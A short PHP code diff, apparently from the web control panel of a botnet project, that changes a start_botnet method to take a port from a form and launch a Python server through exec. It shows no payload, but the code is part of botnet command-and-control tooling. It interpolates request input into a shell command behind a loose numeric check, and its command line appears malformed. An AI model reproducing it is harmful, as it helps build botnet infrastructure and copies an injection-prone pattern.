@@ -83,14 +83,26 @@ class HomeController extends Controller
 
 
 
-    public function start_botnet()
+    public function start_botnet(Request $request)
     {
-        $command = '/home/debian/PA-BOTNET-WEB/launcher-python.sh > /dev/null 2>&1 & echo $!';
-        exec($command, $output, $return);
-        $pid = $output[0]; // PID du processus lancé
+        // Récupérer le port du formulaire
+        $port = $request->input('port');
     
-        return redirect('/home')->with('output', "Processus démarré avec le PID $pid");
+        // Validation basique pour s'assurer que le port est un entier et dans la plage adéquate
+        if (!is_numeric($port) || $port < 1023 || $port > 65535) {
+            return redirect('/home')->with('output', "Port invalide. Choisissez un port entre 1023 et 65535.");
+        }
+    
+        // Construire la commande avec le port spécifié
+        $command = "python3 /home/debian/PA-BOTNET-PYSRV/venv/bin/python3 main.py --start --port $port > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+    
+        // Le PID du processus lancé
+        $pid = $output[0];
+    
+        return redirect('/home')->with('output', "Processus démarré avec le PID $pid sur le port $port");
     }
+    
 
     public function stop_botnet()
     {
